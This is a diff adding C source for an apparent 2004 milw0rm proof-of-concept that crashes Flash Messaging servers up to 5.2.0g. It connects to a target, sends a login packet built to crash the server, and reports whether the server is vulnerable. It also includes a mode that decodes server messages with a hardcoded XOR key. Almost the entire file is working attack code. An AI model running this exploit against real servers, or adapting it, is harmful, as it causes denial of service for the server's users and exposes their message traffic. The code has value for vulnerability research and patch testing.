@@ -1,0 +1,391 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+/*
+
+Show_dump 0.1
+
+    Copyright 2004 Luigi Auriemma
+
+    This program is free software; you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation; either version 2 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program; if not, write to the Free Software
+    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA
+
+    http://www.gnu.org/licenses/gpl.txt
+
+function to show the hex dump of a buffer
+
+Usage:
+
+    to show the hex dump on the screen:
+        show_dump(buffer, buffer_length, stdout);
+
+    to write the hex dump in a file or other streams:
+        show_dump(buffer, buffer_length, fd);
+
+    (if you know C you know what FILE *stream means 8-)
+*/
+
+
+
+void show_dump(unsigned char *buff, unsigned long buffsz, FILE *stream) {
+    const char      *hex = "0123456789abcdef";
+    unsigned char   buffout[68],
+                    *pout,
+                    *p1,
+                    *p2,
+                    i,
+                    rest;
+
+
+    p1 = buff;
+    p2 = buff;
+
+    while(buffsz) {
+
+        pout = buffout;
+        if(buffsz < 16) rest = buffsz;
+            else rest = 16;
+
+        for(i = 0; i < rest; i++, p1++) {
+            *pout++ = hex[*p1 >> 4];
+            *pout++ = hex[*p1 & 0xf];
+            *pout++ = 0x20;
+        }
+
+        for(i = pout - buffout; i < 50; i++, pout++) *pout = 0x20;
+
+        for(i = 0; i < rest; i++, p2++, pout++) {
+            if(*p2 >= 0x20) *pout = *p2;
+                else *pout = 0x2e;
+        }
+
+        *pout++ = 0x0a;
+        *pout   = 0x00;
+
+        fputs(buffout, stream);
+        buffsz -= rest;
+    }
+}
+
+
+
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+    #define close   closesocket
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netdb.h>
+    #include <netinet/in.h>
+#endif
+
+
+
+#define VER     "0.1"
+#define PORT    645
+#define BUFFSZ  8192
+#define TIMEOUT 3
+#define LOGIN   "\xd1" "3" \
+                "\xd1" "1" \
+                "\xd1" "10/07/2004" /* date */ \
+                "\xd1" "00.00.00"   /* time (hh.mm.ss) */ \
+                "\xd1" \
+                "\xd1" \
+                "\xd1" "%s"         /* nickname */ \
+                "\xd1" \
+                "\xd1" "000000" \
+                "\xd1"
+
+
+
+int timeout(int sock);
+void flashmsg_algo(u_char *data, int len);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    int         sd,
+                i,
+                len,
+                nonull = 0,
+                chr    = 0x69;
+                /* the normal chr must be 0x00, and if it is different */
+                /* causes the immediate crash of the server */
+    u_short     port = PORT;
+    u_char      buff[BUFFSZ],
+                pck[BUFFSZ >> 1],
+                *p,
+                *nickname = "crash";
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Flash Messaging <= 5.2.0g (rev 1.1.2) server crash and decoder "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@altervista.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s [options] <server>\n"
+            "\n"
+            "Options:\n"
+            "-p PORT   specify the server port (default %d)\n"
+            "-s NICK   this tool will act as a client emulator and will show any decoded\n"
+            "          message or command sent by the server to you.\n"
+            "          You must also specify the nickname you wanna use\n"
+            "          By default this tool is a proof-of-concept ables to crash the server\n"
+            "-n        use this option to see any server data in a more comprehensible text\n"
+            "          format. By default any data block is showed in hexadecimal mode\n"
+            "\n", argv[0], PORT);
+        exit(1);
+    }
+
+    argc--;
+    for(i = 1; i < argc; i++) {
+        switch(argv[i][1]) {
+            case 'p': port = atoi(argv[++i]); break;
+            case 's': {
+                chr = 0x00;
+                nickname = argv[++i];
+                } break;
+            case 'n': nonull = 1; break;
+            default: {
+                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
+                exit(1);
+            }
+        }
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    peer.sin_addr.s_addr = resolv(argv[argc]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(sd < 0) std_err();
+
+    printf("- target   %s:%hu\n",
+        inet_ntoa(peer.sin_addr),
+        port);
+    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
+      < 0) std_err();
+
+    fputs("- prepare login data\n", stdout);
+    len = snprintf(
+        pck,
+        sizeof(pck) - 1,
+        LOGIN,
+        nickname);
+    if((len < 0) || (len > sizeof(pck))) {
+        fputs("\nError: the nickname you have inserted is longer than my buffer\n\n", stdout);
+        exit(1);
+    }
+
+    p = buff;
+    for(i = 0; i < len; i++) {
+        *p++ = pck[i];
+        *p++ = chr;
+    }
+
+    len <<= 1;
+    flashmsg_algo(buff, len);
+
+    fputs("- send login data\n", stdout);
+    if(send(sd, buff, len, 0)
+      < 0) std_err();
+
+    if(chr) {
+        fputs("- check server\n", stdout);
+        if((timeout(sd) < 0) || ((len = recv(sd, buff, BUFFSZ, 0)) <= 0)) {
+            fputs("\nServer IS vulnerable!!!\n\n", stdout);
+        } else {
+            fputs("\nServer doesn't seem vulnerable, check its decoded reply:\n", stdout);
+            show_dump(buff, len, stdout);
+        }
+    } else {
+        for(;;) {
+            len = recv(sd, buff, BUFFSZ, 0);
+            if(len < 0) std_err();
+            if(!len) break;
+            flashmsg_algo(buff, len);
+            if(nonull) {
+                p = buff;
+                for(i = 0; i < len; i += 2, p++) {
+                    *p = buff[i];
+                    if(*p == 0xd1) *p = '\n';   // 0xd1 = delimiter
+                }
+                *p = 0x00;
+                printf("\n--------------------\n%s", buff);
+            } else {
+                fputc('\n', stdout);
+                show_dump(buff, len, stdout);
+            }
+        }
+    }
+
+    close(sd);
+
+    return(0);
+}
+
+
+
+void flashmsg_algo(u_char *data, int len) {
+    int     i;
+    const static u_char encdata[] =
+            "ScratchIt" "YouFool";
+
+    for(i = 0; i < len; i++) {
+        *data++ ^= encdata[i & 15] - 38;
+        *data++ ^= 38;
+    }
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct  hostent *hp;
+    u_long  host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolve hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+
+
+
+// milw0rm.com [2004-03-02]
